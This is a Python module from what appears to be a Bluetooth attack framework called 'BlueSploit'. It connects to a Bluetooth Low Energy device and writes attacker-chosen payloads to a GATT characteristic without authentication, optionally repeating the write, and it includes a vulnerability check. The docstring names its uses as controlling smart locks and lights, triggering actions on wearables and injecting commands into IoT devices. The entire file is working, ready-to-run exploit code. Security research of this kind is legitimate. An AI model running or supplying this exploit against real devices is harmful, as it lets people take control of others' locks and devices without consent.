"""
BlueSploit Module: Unauthenticated GATT Write Exploit
Exploits BLE devices that allow unauthenticated writes to GATT characteristics
Author: Mr-IoT
"""

import asyncio
from typing import Optional, List
from core.base import (
    ExploitModule, ModuleInfo, ModuleOption,
    BTProtocol, Severity, ExploitResult
)
from core.utils.printer import (
    print_success, print_error, print_info, print_warning, Colors
)

try:
    from bleak import BleakClient
    from bleak.exc import BleakError
    BLEAK_AVAILABLE = True
except ImportError:
    BLEAK_AVAILABLE = False


class Module(ExploitModule):
    """
    Unauthenticated GATT Write Exploit
    
    Writes arbitrary data to a BLE characteristic without authentication.
    This can be used to:
    - Control smart devices (locks, lights, toys)
    - Trigger actions on wearables
    - Inject commands into IoT devices
    - Test for write-without-response vulnerabilities
    
    Based on the Pre-Pairing Attack Surface research.
    """
    
    info = ModuleInfo(
        name="exploits/ble/unauth_write",
        description="Unauthenticated GATT characteristic write",
        author=["v33ru"],
        protocol=BTProtocol.BLE,
        severity=Severity.HIGH,
        references=[
            "https://github.com/v33ru/PhantomTouch",
            "https://www.bluetooth.com/specifications/gatt/"
        ]
    )
    
    def _setup_options(self) -> None:
        """Define exploit options"""
        self.options = {
            "target": ModuleOption(
                name="target",
                required=True,
                description="Target BD_ADDR (XX:XX:XX:XX:XX:XX)"
            ),
            "char_uuid": ModuleOption(
                name="char_uuid",
                required=True,
                description="Target characteristic UUID"
            ),
            "payload": ModuleOption(
                name="payload",
                required=True,
                description="Payload to write (hex string, e.g., 0102030405)"
            ),
            "write_type": ModuleOption(
                name="write_type",
                required=False,
                description="Write type: 'request' (with response) or 'command' (without response)",
                default="command"
            ),
            "repeat": ModuleOption(
                name="repeat",
                required=False,
                description="Number of times to send payload",
                default=1
            ),
            "delay": ModuleOption(
                name="delay",
                required=False,
                description="Delay between repeated writes (ms)",
                default=100
            ),
            "timeout": ModuleOption(
                name="timeout",
                required=False,
                description="Connection timeout (seconds)",
                default=15
            )
        }
    
    def _parse_payload(self, payload_str: str) -> Optional[bytes]:
        """
        Parse payload string to bytes
        
        Accepts:
        - Hex string: "0102030405" or "01 02 03 04 05" or "01:02:03:04:05"
        - ASCII string prefixed with 's:': "s:hello"
        """
        payload_str = payload_str.strip()
        
        # ASCII string
        if payload_str.startswith("s:"):
            return payload_str[2:].encode('utf-8')
        
        # Hex string - remove common separators
        hex_str = payload_str.replace(" ", "").replace(":", "").replace("-", "")
        
        # Remove 0x prefix if present
        if hex_str.lower().startswith("0x"):
            hex_str = hex_str[2:]
        
        try:
            return bytes.fromhex(hex_str)
        except ValueError as e:
            print_error(f"Invalid payload format: {e}")
            return None
    
    async def _exploit_async(self, address: str, char_uuid: str, 
                            payload: bytes) -> ExploitResult:
        """Execute the exploit asynchronously"""
        timeout = self.get_option("timeout")
        write_type = self.get_option("write_type")
        repeat = int(self.get_option("repeat"))
        delay = int(self.get_option("delay"))
        
        # Determine if we need response
        with_response = (write_type.lower() == "request")
        
        result = ExploitResult(
            success=False,
            message="",
            data={
                "target": address,
                "characteristic": char_uuid,
                "payload": payload.hex(),
                "writes_sent": 0
            }
        )
        
        print_info(f"Connecting to {address}...")
        
        try:
            async with BleakClient(address, timeout=timeout) as client:
                if not client.is_connected:
                    result.message = "Failed to connect"
                    return result
                
                print_success(f"Connected to {address}")
                
                # Verify characteristic exists
                char_found = False
                for service in client.services:
                    for char in service.characteristics:
                        if str(char.uuid).lower() == char_uuid.lower():
                            char_found = True
                            
                            # Check if writable
                            if "write" not in char.properties and \
                               "write-without-response" not in char.properties:
                                print_warning(f"Characteristic may not be writable!")
                                print_info(f"Properties: {char.properties}")
                            break
                
                if not char_found:
                    result.message = f"Characteristic not found: {char_uuid}"
                    print_error(result.message)
                    return result
                
                print_info(f"Target characteristic: {char_uuid}")
                print_info(f"Payload ({len(payload)} bytes): {payload.hex()}")
                print_info(f"Write type: {'with response' if with_response else 'without response'}")
                
                if repeat > 1:
                    print_info(f"Sending {repeat} times with {delay}ms delay")
                
                print()
                
                # Execute writes
                for i in range(repeat):
                    try:
                        await client.write_gatt_char(
                            char_uuid,
                            payload,
                            response=with_response
                        )
                        result.data["writes_sent"] += 1
                        
                        if repeat > 1:
                            print(f"  [{Colors.GREEN}+{Colors.RESET}] Write {i+1}/{repeat} sent")
                        else:
                            print_success("Payload delivered!")
                        
                        if i < repeat - 1 and delay > 0:
                            await asyncio.sleep(delay / 1000.0)
                            
                    except Exception as e:
                        print_error(f"Write {i+1} failed: {e}")
                        if "not permitted" in str(e).lower():
                            result.message = "Write not permitted - authentication may be required"
                            return result
                
                result.success = True
                result.message = f"Successfully sent {result.data['writes_sent']} write(s)"
                
        except asyncio.TimeoutError:
            result.message = f"Connection timed out after {timeout}s"
            print_error(result.message)
        except BleakError as e:
            result.message = f"BLE error: {e}"
            print_error(result.message)
        except Exception as e:
            result.message = f"Unexpected error: {e}"
            print_error(result.message)
        
        return result
    
    async def _check_async(self, address: str, char_uuid: str) -> bool:
        """Check if target is vulnerable"""
        timeout = self.get_option("timeout")
        
        print_info(f"Checking {address} for vulnerability...")
        
        try:
            async with BleakClient(address, timeout=timeout) as client:
                if not client.is_connected:
                    print_error("Failed to connect")
                    return False
                
                # Find characteristic
                for service in client.services:
                    for char in service.characteristics:
                        if str(char.uuid).lower() == char_uuid.lower():
                            props = char.properties
                            
                            print_info(f"Found characteristic: {char_uuid}")
                            print_info(f"Properties: {', '.join(props)}")
                            
                            if "write-without-response" in props:
                                print_success("VULNERABLE: Write-without-response enabled!")
                                print_info("This allows unauthenticated writes")
                                return True
                            elif "write" in props:
                                print_warning("Write is enabled, but may require authentication")
                                print_info("Try the exploit to confirm")
                                return True
                            else:
                                print_info("Characteristic is not writable")
                                return False
                
                print_error(f"Characteristic not found: {char_uuid}")
                return False
                
        except Exception as e:
            print_error(f"Check failed: {e}")
            return False
    
    def check(self) -> bool:
        """Check if target is vulnerable"""
        if not BLEAK_AVAILABLE:
            print_error("Bleak library not installed!")
            return False
        
        target = self.target
        char_uuid = self.get_option("char_uuid")
        
        if not target or not char_uuid:
            print_error("target and char_uuid must be set")
            return False
        
        if not self.validate_bd_addr(target):
            print_error(f"Invalid BD_ADDR: {target}")
            return False
        
        return asyncio.run(self._check_async(target, char_uuid))
    
    def run(self) -> bool:
        """Execute the exploit"""
        if not BLEAK_AVAILABLE:
            print_error("Bleak library not installed!")
            print_info("Install with: pip install bleak")
            return False
        
        target = self.target
        char_uuid = self.get_option("char_uuid")
        payload_str = self.get_option("payload")
        
        # Validate inputs
        if not self.validate_bd_addr(target):
            print_error(f"Invalid BD_ADDR: {target}")
            return False
        
        payload = self._parse_payload(payload_str)
        if payload is None:
            return False
        
        if len(payload) == 0:
            print_error("Payload cannot be empty")
            return False
        
        if len(payload) > 512:
            print_warning(f"Large payload ({len(payload)} bytes) - may be truncated by device")
        
        try:
            result = asyncio.run(self._exploit_async(target, char_uuid, payload))
            
            # Store result
            self.add_result(result)
            
            # Print summary
            print(f"\n  {Colors.CYAN}═══ Exploit Result ═══{Colors.RESET}")
            print(f"  Status: {Colors.GREEN if result.success else Colors.RED}{result.message}{Colors.RESET}")
            print(f"  Writes sent: {result.data['writes_sent']}")
            print()
            
            return result.success
            
        except KeyboardInterrupt:
            print_warning("\nExploit interrupted")
            return False
        except Exception as e:
            print_error(f"Exploit failed: {e}")
            return False
